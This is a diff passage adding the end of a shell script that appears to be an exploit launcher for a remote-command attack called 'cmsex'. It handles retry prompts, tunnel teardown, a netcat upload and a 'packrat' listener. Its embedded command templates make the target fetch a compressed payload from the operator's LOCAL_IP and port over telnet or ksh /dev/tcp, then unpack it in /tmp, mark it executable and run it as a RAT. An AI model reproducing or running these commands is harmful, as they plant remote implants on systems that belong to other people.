+		notered -n "\rCounting down: $CALLBACKDELAY  "
+		CALLBACKDELAY=`expr $CALLBACKDELAY - 1`
+		sleep 1
+	    done
+	fi
+    fi
+    [ "$REDIRECT" ] && notered "\n\nIf this is your last sploit, you can close down the -tunnel
+currently listening on $TUNNELPORT with this at any local prompt:
+$COLOR_NORMAL
+   /current/bin/closetunnel\n\n"
+    note "\nIf it worked, hit return to exit.\n"
+    notered -n "Do you want to try again? [N] "
+    read ans
+    [ ! "$ans" -o "${ans:0:1}" = "n" -o "${ans:0:1}" = "N" ] && break
+    # echo -e "$usagetext" 
+    
+#    notered "\nIf \"ksh\" method might have failed, add the -t argument to try the old telnet way."
+    notered "If \"tr\" method might have failed, add the -M argument to disable munging."
+#    notered "If still failing after trying -t, -T and -tT, try cmsex.tn.gr_USE_WHEN_cmsex.auto_FAILS."
+    ATTEMPT=`expr $ATTEMPT + 1`
+done
+# disabled this for now 20030603
+#if [ "$REDIRECT" ] ; then
+#    note "Closing down -tunnel ports"
+#    tunnelcmd c 1 2
+#    tunnelcmd q
+#fi
+if [ "$POSTRUN2" ] ; then
+    note "\nOnce you see all is done, you may want to proceed with:\n\n$POSTRUN2\n\n"
+    notered NOTE: Listener may not be active until you ^C the netcat upload.
+fi
+
+if [ "$AUTOMODE" ] ; then
+    ps -efwwww | grep PACKRAT | grep -v grep && \
+	notered "\n\nYou need to close packrat window before this one can exit.\n\n"
+fi
+
+GARBAGE="
+-T       Do NOT use tr at all (can be used with or without -t)
+
+In the usual upload/execute mode, unless the -T option is used, $PROG
+uses the remote system's tr program (see \"man tr\") to unmunge the
+string sent via cmsex into the commands we want him to execute. See dtail
+below. $PROG will build and show the munged and unmunged strings,
+prompting to abort or continue before any packets are sent.
+
+
+     Command sent to cmsex will be munged (unless -T is used) from one of:
+
+OLDCMD=\"cd /tmp;mkdir -p \${REMOTE_DIR} && cd \${REMOTE_DIR};telnet \${LOCAL_IP} \${LOCAL_PORT} < /dev/console | uudecode > /dev/null 2>&1 && uncompress -f \${REMOTE_FNAME}.Z && chmod 755 \${REMOTE_FNAME} && PATH=.\${RAT_PREARGS} \${DOTSLASH}\${REMOTE_FNAME}\${RAT_POSTARGS}\"
+
+CMD=\"cd /tmp;mkdir -p \${REMOTE_DIR} && cd \${REMOTE_DIR};/bin/ksh -c \"cat < /dev/tcp/\${LOCAL_IP}/\${LOCAL_PORT} > \${REMOTE_FNAME}.Z && uncompress -f \${REMOTE_FNAME}.Z && chmod 755 \${REMOTE_FNAME} && PATH=.\${RAT_PREARGS} \${DOTSLASH}\${REMOTE_FNAME}\${RAT_POSTARGS}\"\"
+
+OR if -T is used, one of these will be used but will not be munged.
+
+
+	    t)  OLDCMD=yes;;
+
+"
